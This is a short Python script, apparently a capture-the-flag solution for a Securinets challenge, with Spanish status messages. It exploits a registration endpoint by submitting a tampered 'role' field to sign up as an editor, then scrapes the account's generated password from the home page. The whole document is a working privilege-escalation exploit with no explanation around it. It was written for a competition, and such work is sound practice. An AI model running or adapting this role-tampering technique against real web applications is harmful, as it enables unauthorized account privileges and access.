import requests
from bs4 import BeautifulSoup

# BASE_URL = "http://172.17.0.2:5000"
BASE_URL = "http://puzzle-c4d26ae9.p1.securinets.tn/"
REGISTER_URL = f"{BASE_URL}/confirm-register"
HOME_URL = f"{BASE_URL}/home"

session = requests.Session()

username = "editor_ctf2"
data = {
    "username": username,
    "email": f"{username}@ctf.local",
    "role": "1"
}

r = session.post(REGISTER_URL, data=data)
if r.status_code == 200 and r.json().get("success"):
    print("[✓] Registro exitoso como EDITOR")

    home = session.get(HOME_URL)
    soup = BeautifulSoup(home.text, "html.parser")
    password_tag = soup.find("code", class_="text-black")
    if password_tag:
        password = password_tag.text.strip()
        print(f"[🔑] Contraseña generada: {password}")
    else:
        print("[✗] No se encontró la contraseña en /home")
else:
    print("[✗] Falló el registro como editor")
